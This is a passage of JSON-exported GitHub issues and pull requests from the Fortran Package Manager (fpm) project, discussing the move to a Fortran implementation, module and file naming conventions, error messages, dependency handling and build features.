            ]
        },
        {
            "number": 131,
            "user": "certik",
            "date": "2020-07-21 15:11:33+00:00",
            "title": "Initial Fortran infrastructure",
            "text": "This PR moves the Haskell version into a bootstrap directory and creates a new fpm package called fpm, which is the Fortran based fpm. For now the Fortran fpm is just the default \"new\" template, but I modified the print statement. The important part is that it is tested by the CI to build and run on all platforms (Linux, macOS and Windows). This provides the initial infrastructure needed so that others can now start working on the Fortran based fpm, and things will get tested by the CI. Once this is merged, we can send subsequent PRs to depend on other Fortran fpm packages for command line, internet access etc., and slowly start building the functionality that we need.\nPlan for this PR:\n\n Move Haskell based version to a dedicated directory (CI test still builds and tests this version)\n Add initial Fortran version as an fpm package\n\n Make CI test to build the Fortran version using the Haskell version\n\n\n\nEverything that I wanted to get done is implemented. This is ready for review.\nFixes #124.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 15:40:40+00:00",
                    "text": "The macOS failure is unrelated (#134)."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 18:58:42+00:00",
                    "text": "The CI gave me a lot of issues today, but I finally got everything building and passing on all platforms. This is ready for review."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 19:29:19+00:00",
                    "text": "Thanks @everythingfunctional for the review. If it looks good to you, then I am going to go ahead and merge this, so that we can start improving various parts of this in subsequent PRs."
                }
            ]
        },
        {
            "number": 130,
            "user": "milancurcic",
            "date": "2020-07-21 15:09:02+00:00",
            "title": "Catch module+program or multiple modules in a source file and print a helpful message to the user",
            "text": "See #126. fpm currently allows either a single module or a single program in a source file. However, Fortran allows having:\n\nMultiple modules per source file\nModule + program in a source file\nProcedures without modules in a source file\n\nfpm should catch these scenarios and print a helpful error message for the user.",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 06:21:28+00:00",
                    "text": "Just a comment: I noticed that fpm does allow more than one module in a file - and it seems to work: one of the source files I experimented with has a small module to define a type and then a module with the same name as the source file that uses it. So not two independent ones, I agree."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:46:10+00:00",
                    "text": "For simplicity, I think by default fpm should simply expect one module per file, and impose the naming consistency convention. We can discuss if we should implement optional options in fpm.toml to allow more modules per file."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:07:57+00:00",
                    "text": "I think this has been fixed already."
                },
                {
                    "user": "certik",
                    "date": "2021-09-08 01:39:39+00:00",
                    "text": "I tried the latest master and unfortunately there is no error or warning printed when more than one module is present in a file. How to reproduce:\nfpm new xx\ncd xx\n\napply the following patch:\n--- a/src/xx.f90\n+++ b/src/xx.f90\n@@ -8,3 +8,14 @@ contains\n     print *, \"Hello, xx!\"\n   end subroutine say_hello\n end module xx\n+\n+module yy\n+  implicit none\n+  private\n+\n+  public :: say_hello\n+contains\n+  subroutine say_hello\n+    print *, \"Hello, xx!\"\n+  end subroutine say_hello\n+end module yy\nthen compile:\n$ fpm build\n + mkdir -p build/dependencies\n + mkdir -p build/gfortran_2A42023B310FA28D/xx\n + gfortran -c test/check.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/xx -I build/gfortran_2A42023B310FA28D/xx  -o build/gfortran_2A42023B310FA28D/xx/test_check.f90.o\n + gfortran -c ././src/xx.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/xx -I build/gfortran_2A42023B310FA28D/xx  -o build/gfortran_2A42023B310FA28D/xx/src_xx.f90.o\n + ar -rs build/gfortran_2A42023B310FA28D/xx/libxx.a build/gfortran_2A42023B310FA28D/xx/src_xx.f90.o\nar: creating archive build/gfortran_2A42023B310FA28D/xx/libxx.a\n + gfortran -c app/main.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/xx -I build/gfortran_2A42023B310FA28D/xx  -o build/gfortran_2A42023B310FA28D/xx/app_main.f90.o\n + mkdir -p build/gfortran_2A42023B310FA28D/app/\n + gfortran  -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/xx -I build/gfortran_2A42023B310FA28D/xx  build/gfortran_2A42023B310FA28D/xx/app_main.f90.o build/gfortran_2A42023B310FA28D/xx/libxx.a -o build/gfortran_2A42023B310FA28D/app/xx\n + mkdir -p build/gfortran_2A42023B310FA28D/test/\n + gfortran  -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/xx -I build/gfortran_2A42023B310FA28D/xx  build/gfortran_2A42023B310FA28D/xx/test_check.f90.o build/gfortran_2A42023B310FA28D/xx/libxx.a -o build/gfortran_2A42023B310FA28D/test/check\nNo warning and no error.\nWe need to be printing warnings (and even errors) every time:\n\nMore than one module or one program is present in a file\nThe module name does not follow the convention of prepending the package name in the module name\n\nAnd both can be overiden in fpm.toml if your package follows a different convention."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 07:38:12+00:00",
                    "text": "We need to be printing warnings (and even errors) every time:\n\nMore than one module or one program is present in a file\nThe module name does not follow the convention of prepending the package name in the module name\n\nAnd both can be overiden in fpm.toml if your package follows a different convention.\n\nA program and a module in the same scope seems completely reasonable to me. Multiple modules less so, still there are use cases for this (example). We have to be careful to not break existing projects or fpm itself when introducing this change. Therefore, this check should at first be opt-in for all projects, we can later make it the default once it found adoption.\nFor example in TOML Fortran the package name toml-f does not cleanly map to the used prefix tomlf_. Same holds true for other projects that use a dash in the package name or a different prefix for the modules than the package name.\nTo handle projects that can't map their package name to a prefix there should be an option in library:\nname = \"toml-f\"\n\n[library]\nnamespace = \"tomlf\"  # or maybe prefix?\nRegarding the opt-in/opt-out of this convention, what table is best suited for this purpose? I wouldn't put it under the top-level and build also does not seem fitting here.\nFinally, the namespace rules doesn't really apply for app/test/example, does it? Those modules are private within the project and can therefore have a less strict naming convention."
                },
                {
                    "user": "certik",
                    "date": "2021-09-08 18:55:20+00:00",
                    "text": "Yes, we definitely need to be careful and we don't want to break things.\nThis is why it is very important to do these \"compliance requirements\" early in fpm's life. That means now. We can always relax them without breaking anything. But we cannot make them more strict.\nWe don't need to require this restriction of just one program/module per file. But it seems like a good habit. The same with the naming convention. @everythingfunctional and I even brainstormed being more strict  on module names and encode the path in them, say in fpm's src/fpm/manifest/build.f90 module would be named fpm_manifest_build. In fact that is precisely how it is already named! So fpm enforcing it would be very natural. This could of course be disabled. However, I can't seem to convince others this is a good idea, so that's all right.\nOne way we can enforce these things is with opt in options, that would be enabled by default for new projects (fpm new) in their fpm.toml file explicitly. That would not break anything. Finally, since there could be quite a few of these \"new restrictions\", we can even lump them together and do something like\ndefaults = \"fpm 0.4.0\"\nWhich would enable (on opt-in basis) any defaults that fpm 0.4.0 likes as defaults. Then fpm 0.5.0 can have different defaults, and things would not break."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-09-08 19:48:00+00:00",
                    "text": "I don't recall what we decided about this, but I think it was this: To protect against module name clashes between the project modules and those of dependencies, a naming convention needs to be enforced to ensure unique module names. @certik describes that convention above.\n\nHowever, I can't seem to convince others this is a good idea, so that's all right.\n\nI don't think this is what's happening; I think it's more that it just hasn't been implemented. I'm in favor of this, for example. I also vaguely recall us having an overall consensus about this, though I can't find the thread.\nAt the same time, we should also allow building valid Fortran code as much as the convention allows it. Is it possible to design a naming convention that would allow multiple-modules-per-source-file and modules+program in a source file?\nHow about this:\n\nSource file src/fpm/manifest/build.f90 must contain a module named fpm_manifest_build\nSource file src/fpm/manifest/build.f90 may contain additional modules named fpm_manifest_build_<suffix>; if it does, src/fpm/manifest will not also contain a directory src/fpm/manifest/build.\nSource file app/main.f90 (or any other source file under app/) may contain a program and a module, if the module is named <package-name>_<suffix>, where suffix is not already in use by modules/source files/directories in src/.\n\nAnd if this works, we should still detect and print a helpful warning message a-la:\nWarning: Multiple modules defined in src/fpm/manifest/build.f90; Consider defining each module in its own source file.\n\nFor the program+module pattern which I enjoy very much, I wouldn't even print a warning. But that's just my preference; I wouldn't strongly oppose warnings for that."
                },
                {
                    "user": "certik",
                    "date": "2021-09-08 21:09:16+00:00",
                    "text": "There are two conventions:\n\nPrefixing all modules just with the project names. I think there is consensus on this (even if it is not implemented and enforced yet).\nNaming the module based on file name. That convention has been there I believe, but it was removed, although I can't find the PR right now. I don't think there is consensus on this. But I still like it, and I am happy that you do too.\n\nI like your thinking about multiple modules in a file. I also use module+main program in the same file sometimes. So I am not against it. As long as fpm can know exactly what is going on and what is where. I think it can."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-09-08 21:28:41+00:00",
                    "text": "I'm also in favor of enforcing (with a light touch if possible, i.e. optional) a one module per file and naming convention rule, as it seems like a pretty clear best practice. I think we don't need such restrictions on app, example or test code, because it seems quite frequent to want to put program+modules in a single source file for the purposes of quick one-off and demonstration code."
                },
                {
                    "user": "certik",
                    "date": "2021-09-08 22:09:17+00:00",
                    "text": "When we depend on a library, it's mainly the src/ directory that gets made \"available\" to use? Or are app, example and test also somehow installed?\nIf so, it would make sense to be strict with the src/ modules (one module per file, strict naming convention based on the name of the package and path)."
                },
                {
                    "user": "LKedward",
                    "date": "2021-09-13 10:11:35+00:00",
                    "text": "As previously discussed I agree with requiring project module prefixes as this is our only option for some form of name-spacing, however I strongly disagree with the need to invent and enforce a convention for naming modules based on file path.\nIMO, such a path-module convention would greatly restrict the ease and flexibility of using fpm as it is now. I don't see any concrete advantage to creating such a convention, but the cost in terms of project maintenance is quite significant. Consider the simple task of restructuring a growing project into subfolders: this would require manually renaming modules and renaming all uses of them in other modules/projects/programs.\nThis would also greatly complicate the task of converting existing packages to fpm since all modules would require renaming. I really do not think we should pursue such a rigid convention within fpm itself, even as an optional feature, but rather leave it up to project maintainers to use a good naming convention."
                },
                {
                    "user": "certik",
                    "date": "2021-09-14 04:13:53+00:00",
                    "text": "Good point about renaming. Note that you have a similar issue in Python. If you move things around, the imports will break, so you have to fix them. If Fortran introduces some kind of namespaces, based on path, it would have exactly the same issue.\nConverting existing packages to fpm does not change as you would be able to just disable this check with a single line in fpm.toml. It can also just be a warning. That way things still compile."
                }
            ]
        },
        {
            "number": 129,
            "user": "milancurcic",
            "date": "2020-07-21 15:04:59+00:00",
            "title": "Handle module name - source file name mismatch and print helpful message to the user",
            "text": "See #128. Currently fpm does not help the user figure out what went wrong if the module name / file name convention is not followed. fpm should detect this and print a helpful message to the user, for example:\nfpm error: I noticed that you defined a module `my` in file `src/mx.f90`. The module name must match the source (path) name. Either rename your module to `mx`, or place it in `src/my.f90`.\n\nor similar.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 12:16:41+00:00",
                    "text": "This might be fixed with #213."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:17:19+00:00",
                    "text": "Correct, the bootstrap version is no longer enforcing any match between module and source file name."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 20:19:28+00:00",
                    "text": "Closing this issue as resolved by #213."
                }
            ]
        },
        {
            "number": 128,
            "user": "arjenmarkus",
            "date": "2020-07-21 09:19:20+00:00",
            "title": "Implicit relationship between the names of a module and the source file that contains it assumed",
            "text": "I have run into a problem that is illustrated with the attached project:\n`\n$ d:/fortran/fpm/fpm.exe build\ngfortran (for build/gfortran_debug/mxmy/mx.o build/gfortran_debug/mxmy/mx.mod)\nfpm.exe: Error when running Shake build system:\nat want, called at src\\Build.hs:205:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n\nDepends on: build/gfortran_debug/mxmy/libmxmy.a\nat need, called at src\\Build.hs:203:13 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\nDepends on: build/gfortran_debug/mxmy/mx.o\nat &%>, called at src\\Build.hs:183:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\nDepends on: build/gfortran_debug/mxmy/mx.o build/gfortran_debug/mxmy/mx.mod\nat error, called at src\\Development\\Shake\\Internal\\Rules\\Files.hs:245:13 in shake-   0.18.5-7VS8ovPeUeSCopHgkQQ1Vu:Development.Shake.Internal.Rules.Files\nRaised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\nbuild/gfortran_debug/mxmy/mx.o\nbuild/gfortran_debug/mxmy/mx.mod - MISSING\n`\n\nThe source file is called \"mx.f90\" but it contains a module \"my\". Apparently this is not currently supported, whether by design or otherwise. It seems to me to be a bug.\ntest-fpm-mxmy.zip",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:51:12+00:00",
                    "text": "Hi Arjen, yes, it's by design, see https://github.com/fortran-lang/fpm/blob/master/PACKAGING.md#single-module-library.\nThe rationale is that if we have higher constraints on the user application or library structure, we can design a more robust build system that has a \"sane default\" with fewer edge cases.\nDo you think the packaging guide could be improved in any way?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:55:06+00:00",
                    "text": "However, the unhelpful response from fpm is not by design, but is due to this exception handling not being implemented. In scenarios like this fpm must be helpful to the user, for example:\nfpm error: I noticed that you defined a module `my` in file `src/mx.f90`. The module name must match the source (path) name. Either rename your module to `mx`, or place it in `src/my.f90`.\n\nor similar."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 14:56:14+00:00",
                    "text": "Yes, the default layout that fpm expects is on purpose restricted, similar to how Cargo does it. The module names must be consistent with the filename.\nHowever, I am all for allowing exceptions, which you could specify by hand in fpm.toml. We should do that.\nThe error message is not helpful. But we should work on fixing both of these things in the Fortran implementation (see #124)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 15:02:18+00:00",
                    "text": "It is not criticism :) - just a user experience. I understand the\nlimitations, but an innocent user may run into this sort of things and not\nbe able to pinpoint the cause (as I was not with my other problem).\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 16:56 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Yes, the default layout that fpm expects is on purpose restricted, similar\n to how Cargo does it. The module names must be consistent with the filename.\n\n However, I am all for allowing exceptions, which you could specify by hand\n in fpm.toml. We should do that.\n\n The error message is not helpful. But we should work on fixing both of\n these things in the Fortran implementation (see #124\n <#124>).\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#128 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5JSM22HTKDFHJED3TR4WUB7ANCNFSM4PDLQ2RQ>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 15:11:32+00:00",
                    "text": "@certik I opened #129 and #130 to track these specific exception handling and error message issues.\nI also created the fpm-fortran tag so that we can tag any issue to be specific to the Fortran implementation and not Haskell. You'll notice that I didn't initially tag #129 and #130 as fpm-fortran, as I'm unsure whether we should leave these unattended for a long time before fpm-fortran is up to speed. I think they're quite critical UI issues."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 19:27:12+00:00",
                    "text": "And I implemented the initial infrastructure for Fortran at #131 to start getting things moving."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 12:17:27+00:00",
                    "text": "This might be fixed with #213."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:18:31+00:00",
                    "text": "The bootstrap version is no longer enforcing any match between module and source file name."
                }
            ]
        },
        {
            "number": 127,
            "user": "urbanjost",
            "date": "2020-07-19 12:33:17+00:00",
            "title": "Should fpm automatically make stdlib available, plus some notes on trying the fpm prototype",
            "text": "July 18, 2020\n\n[  ]  I think stdlib should be available via fpm and possibly included by default. It would\nbe a shame if there were not some integration between the projects.\n\nA few comments on fpm (Fortran Package Manager)\n\n\nI could not find a way using \"fpm build\" or \"fpm run\" to work with\nprograms that required external libraries (not always available\nstatically) like X11 Windows and ncurses and various math libraries\ninstalled on my machine. Is there some description of how to set\ncompiler options I missed?\n\n\nI could not get an \"fpm\" command to recognize any compiler except\ngfortran(1).\n\n\nSome type of \"install\" mode is highly desirable to place files in a single location.\nIt should include some way to handle data and documentation files\nas well as the *.a and *.mod files and executables. Otherwise, seperate program\ndevelopment ends up producing a lot of duplication if each program requires the\nsame packages, or you are forced to keep all development in the same file tree.\n\n\nFor builds that build many programs having to put each one in a seperate directory\ncreates a very awkward file layout. Some type of option for executables where\nyou could give a list of specific files to use for building a program might be\na solution. Automatically assuming all files at or below the path is not always\ndesirable even though it makes some cases very simple to configure.\n\n\nThe \"run\" subcommand is fine for a single program, but if you have a number of\ntests or programs it would be nice if it had a \"list\" option.\n\n\nbeing able to search and list entries in a central registry is apparently planned (?)\nbut it would at least be nice if\npackages listed at\nhttps://fortran-lang.org were marked as to whether fpm support\nwas enabled.  As a substitute for a search/list feature I did a\nglobal search (on just github) of the filename \"fpm.toml\" and at\nleast on that site there were not many hits, so maybe this is too\nearly anyway.\n\n\nThe install of fpm(1) required way too much infrastructure. A Fortran-based version\nis planned?\n\n\nHere is a list of my public repositories that are fpm-enabled:\n\n    [dependencies]\n    # worked well with simple single-module projects\n     M_kracken95   = { git = \"https://github.com/urbanjost/M_kracken95.git\" }\n     M_cli         = { git = \"https://github.com/urbanjost/M_cli.git\"  }\n     M_calculator  = { git = \"https://github.com/urbanjost/M_calculator.git\" }\n     M_change      = { git = \"https://github.com/urbanjost/M_change.git\" }  \n     M_color       = { git = \"https://github.com/urbanjost/M_color.git\" }\n     M_history     = { git = \"https://github.com/urbanjost/M_history.git\" }\n     M_io          = { git = \"https://github.com/urbanjost/M_io.git\" }\n     M_msg         = { git = \"https://github.com/urbanjost/M_msg.git\" }\n     M_time        = { git = \"https://github.com/urbanjost/M_time.git\" }\n     M_strings     = { git = \"https://github.com/urbanjost/M_strings.git\" }\n     # uses ISO_C_BINDING but no C wrapper code. fpm(1) worked well\n     M_process     = { git = \"https://github.com/urbanjost/M_process.git\" }\n     #\n     # required creating makefiles:\n     M_system      = { git = \"https://github.com/urbanjost/M_system.git\" }\n     # this did not work satisfactorily ...\n     M_draw        = { git = \"https://github.com/urbanjost/M_draw.git\" }\n\nFor projects not requiring other libraries or C wrappers and just comprised of\na few modules I had no problems.\nAs soon as I needed some C wrappers or needed to build A C library as part of\nthe project it got very difficult. I really could not come up with a satisfactory\nbuild of the M_draw.f90 module, as it requires data files and C routines; and I\ntried a lot of variations. It is not clearly shown in the documentation just how\nyou can use a customized build script or makefile and still have it work cleanly\nwith fpm.\n\n\nInitializing an existing .git directory with \"fpm init\" was problematic as it\nalways tries to initialize git and overwrites README.md. To use \"fpm\ninit\" required Moving the original directory; making new one with\n\"fpm init\"; removing .git and them moving files back.  Would be\nnice if instead of the \"Jane Doe\" fpm.toml file created that it\nuse names from .gitconfig for initial values, and not overwrite\nexisting files like README.md or initialize git(1) if .git exists\nif you run it in an existing directory.\n\n\nIt should at least be noted in the documentation that there is no \"fpm clean\"\noption\n\n\n.F90 files appear to be supported, but with no way to specify preprocessor\noptions; since preprocessors vary between compilers this could get complicated\nbut I was wondering whether a specific preprocessor would be supported in the\nfuture and how options can be passed to one now.\n\n\nIt was easier to just create a Makefile for any legacy codes with routines not\nin modules or when C wrappers were needed, but worked quite well for single-module\nprojects. It was nice to be able to write a program that needed access to file\nsystem information, manipulated strings, printed date and time information and",
            "comments": []
        },
        {
            "number": 126,
            "user": "arjenmarkus",
            "date": "2020-07-18 15:11:25+00:00",
            "title": "Complaints about recursive rules",
            "text": "I tried to use fpm on a somewhat more complex collection of Fortran modules and their test programs. They are all part of my Flibs project (http://flibs.sf.net). I copied the source files for the modules to a directory src and the sources for the test programs to test/xxx (well, for two test programs, to get started). Then I set up a fpm.toml file. All have been attached.\nfpm gave me an error message:\nBuild system error - recursion detected:\nKey type:   FilesQ\nKey value:  build/gfortran_debug/computing/combinations.o build/gfortran_debug/computing/combinations.mod\nRules may not be recursive\nAs all the modules are standalone I am not sure what went wrong. Also, I noticed that with my first attempt it complained about a different (!) module than when I redirected the output.\nIt may be that the problem has already been solved - my version of fpm is one month old.\ntest-fpm-flibs.zip",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:25:52+00:00",
                    "text": "Some of the source files contain a program at the end which uses the module. This use statement signals to the fpm build system that the module depends on itself. Thus, the recursive rule error message.\nBasic fix, remove the example programs from the end of the module source files."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 06:34:17+00:00",
                    "text": "Hi Brad,\n\noh, I will have to check that - I was rather certain there was nothing like\nthat ... Thanks for looking into this.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 01:26 schreef Brad Richardson <\nnotifications@github.com>:\n\u2026\n Some of the source files contain a program at the end which uses the\n module. This use statement signals to the fpm build system that the module\n depends on itself. Thus, the recursive rule error message.\n\n Basic fix, remove the example programs from the end of the module source\n files.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#126 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRYYYOIWSM7W3KDR5WLR4THA3ANCNFSM4PAASMNA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 09:15:18+00:00",
                    "text": "Yes, two of the source files contained a test program (I should have a look at those :)). But when I removed them and tried again, I ran into another issue: a presumed relation between the names of the module and the source file that contains it. I will report it as a separate issue."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:57:56+00:00",
                    "text": "Especially because this (module + program in a source file) is valid, fpm needs to be able to detect this and print a helpful message to the user."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 15:03:58+00:00",
                    "text": "Yes, the error message was puzzling. If you know the design decisions\nand usage constraints it is probably easy enough to locate the cause,\nbut for a novice user it will not immediately be clear.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 16:58 schreef Milan Curcic <notifications@github.com>:\n\u2026\n\n Especially because this (module + program in a source file) is valid, fpm needs to be able to detect this and print a helpful message to the user.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 18:47:23+00:00",
                    "text": "I'll close this as fpm now supports having programs and modules in the same file and has removed any required relationship between file path and module name."
                }
            ]
        },
        {
            "number": 125,
            "user": "arjenmarkus",
            "date": "2020-07-17 07:42:10+00:00",
            "title": "Not so trivial program: Fortran with a bit of C and a prebuilt library",
            "text": "After this month's call, I looked for a small but not entirely trivial program to try fpm with (not trivial in the sense that it consists of several source files, rather than a single one). I found one that is a trifle more complex than any of the examples I have seen and I would like advice on how to deal with it:\n\nIt consists of several Fortran source files and a single C source file\nSome of the Fortran source files require preprocessing (the extension is .F90, so some compilers will do that automatically)\nThe program needs to be linked to a (C) library that has been installed on the system\n\nThe trivial way I build it is via a bunch of compile commands with the required options, so ultimately that could function as a custom build script, but the above set-up seems a fairly common situation.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-17 19:58:55+00:00",
                    "text": "With current functionality, your only option for this is a custom build script. At some point in the future we'll have the capabilities built into fpm to handle linking to a system library and (hopefully) compiling C code, but we aren't there yet."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-18 14:06:12+00:00",
                    "text": "I understand - I already thought that would be the answer :). Consider it another likely scenario that - at some point in time - needs to be supported.."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:46:48+00:00",
                    "text": "This should be possible with Fortran fpm now, as we support compiling C code there and linking with external libraries."
                }
            ]
        },
        {
            "number": 124,
            "user": "certik",
            "date": "2020-07-16 22:11:29+00:00",
            "title": "Create the infrastructure for the Fortran version",
            "text": "Per our discussion on the phone call:\n\nUse this repository\ncreate a directory \"fortran\" and \"haskell\" (we can call it differently) and put the haskell version into the \"haskell\" directory and start a Fortran version in the \"fortran\" directory\nUse fpm to build the \"fortran\" directory --- it will be just an fpm package\nEnsure haskell fpm can build it\nReuse the test suite for both haskell and fortran\n\nThis is probably the highest priority issue now so I pinned it.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 18:59:55+00:00",
                    "text": "I think the PR #131 that I just finished fixes this issue."
                }
            ]
        },
        {
            "number": 123,
            "user": "certik",
            "date": "2020-07-16 20:07:51+00:00",
            "title": "Allow to generate a standalone tarball with all dependencies",
            "text": "fpm should have a feature like fpm tarball --include-deps that will create a tarball of the current fpm package together with all dependencies and a build system such as CMake (#69), so that one can unpack this tarball at a machine without internet connection, and build everything from scratch (all the dependencies and the main application).\nThere are many usages of this feature:\n\nan application that must run on an HPC machine without internet connection, and I want to distribute it as a tarball that is built using cmake (a common expectation)\nfpm itself --- we can distribute fpm source code like this, and anybody with cmake can then build it from source (no other dependencies needed)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-22 08:28:51+00:00",
                    "text": "I was trying to figure out what it takes to implement a command like this, but there are a some things that are unclear. First, I would propose to name the command fpm dist rather than fpm tarball.\nThe second thing that comes to mind is, in case we use fpm dist --cmake and generate a CMake based build system, how do we make CMake fetch the dependencies? FetchContent works fine, but only if the upstream project supports CMake as well.\nOn solution would be to rely on a release artefact created by fpm and uploaded somewhere instead of the default git-archive.\nFinally, how do we handle the case of fpm dist --cmake --include-deps? Of course we can recursively generate the CMake files for all the projects and include them in a tarball, but some dependencies come with their own CMake files, would we overwrite (maybe with a fpm dist --cmake --include-deps --overwrite)?\nAs a note, in case anyone wants to give this a real try. Implementing a fpm dist --meson will probably be way less painful than implementing robust CMake."
                }
            ]
        },
        {
            "number": 122,
            "user": "ivan-pi",
            "date": "2020-07-16 19:20:29+00:00",
            "title": "Have fpm define precision",
            "text": "Recent Fortran language resources usually recommend defining a module with constants defining the precision that are later reused throughout the code, for example:\nmodule precision\n  integer, parameter :: sp = kind(1.0)\n  integer, parameter :: dp = kind(1.0d0)\n  integer, parameter :: wp = dp\nend module\nThese kinds of modules are duplicated throughout libraries. This can potentially lead to incompatibilities, i.e. if library 1 uses single precision as default, and library 2 uses double precision. The user is then faced with the problem of either adapting library 1, or making library 2 use the precision module from library 1.\nWould it make sense to have some mechanism to give fpm the \"power\" of enforcing a certain default precision? Hopefully in the long-term most Fortran programmers would default to just using constants from the stdlib precision module. This might not always be enough (i.e. interfacing with C, or perhaps using fpm on some non x86_64 architectures).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-16 19:25:27+00:00",
                    "text": "Great question. I don't know, I am hoping we will encourage the community to use stdlib to get precision. Fpm has the \"power\" to do anything, but the question is how it would work and if it makes sense. Like the promoting of single precision to double?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-17 09:46:23+00:00",
                    "text": "Yes, the entire situation is kind of messy. I have seen some codes which rely on the compiler flags such as -fdefault-real-8 to automatically upgrade real literals such as 1.0 to double precision.\nIn the Fortran METIS interface I used the C preprocessor:\n#ifdef REAL64\n    integer, parameter, public :: real_t = c_double\n#else\n    integer, parameter, public :: real_t = c_float\n#endif\nto allow users to select the precision depending on the version of METIS installed on their system.\nI think it would be good if we could establish some guidelines for package developers whether such precision choices are responsibility of the package developer or the package user, and whether it should be done by 1) a preprocessor (C, fypp) + build system, or 2) the package manager."
                }
            ]
        },
        {
            "number": 121,
            "user": "MarkWieczorek",
            "date": "2020-07-15 21:46:49+00:00",
            "title": "github dependencies are never updated",
            "text": "One method for downloading dependencies is to specify a github project, and optionally a specific branch, tag, or commit. However, once the entire git project is cloned, it is never updated.\nAn option should be provided to allow to update the dependencies when they change at github. In my opinion, if a specific tag or commit is not specified, the default behavior should in fact be to check for updates automatically.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-15 23:16:10+00:00",
                    "text": "Actually I think we should do it like Cargo --- fpm determines a particular version that satisfies your fpm.toml, and generates fpm.lock. Then it never checks or updates any dependencies, it simply uses fpm.lock which has the exact dependency pinned down. But you can run fpm update command that will update your dependencies (and updates your fpm.lock file). More info:\nhttps://doc.rust-lang.org/cargo/commands/cargo-update.html"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 23:47:29+00:00",
                    "text": "Right now it's not doing anything to check that the version that is there is the right version, that it was cloned and checked-out correctly, etc, just that there is something there.\nWe haven't come up with a coherent strategy for version constraint checking, let alone version constraint solving, so I've just punted on doing anything for now. We'll probably look at what Cargo's solution was.\nThe solution that @certik described is what many (most?) language specific package managers have settled on. It prevents things in your code from breaking randomly because somebody pushed a bug to their repository."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-16 09:27:03+00:00",
                    "text": "A related feature request is the following: Instead of cloning the entire repo, it would be useful in many instances (to speed up the download process) to only do a shallow clone (with git clone --depth=1). I'm not sure what the default beviour should be, but it would be useful to at least have the option."
                }
            ]
        },
        {
            "number": 120,
            "user": "MarkWieczorek",
            "date": "2020-07-14 12:30:13+00:00",
            "title": "\"name\" should not be a required fpm.toml keyword for files that do not link to an fpm library",
            "text": "In the current configuration, it is necessary to specify a name keyword at the top of the fpm.toml file. This name is used to name the directory that contains the .mod, .a, and .o files that are used to generate a static library.\nHowever, if you have a project with only a single file in the app folder, there is no need to have a src folder nor to compile a library at all. In this case, however, if you omit the name keyword, fpm will exit with the error tomland decode error:  Key name is not found\nFurthermore, in my opinion, the name keyword should not be at the head of the file, but should more logically be under the [library] heading, as this is where all the information about the compiled archive is listed. (This would be analogous to name in [[executable]]).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-14 15:48:46+00:00",
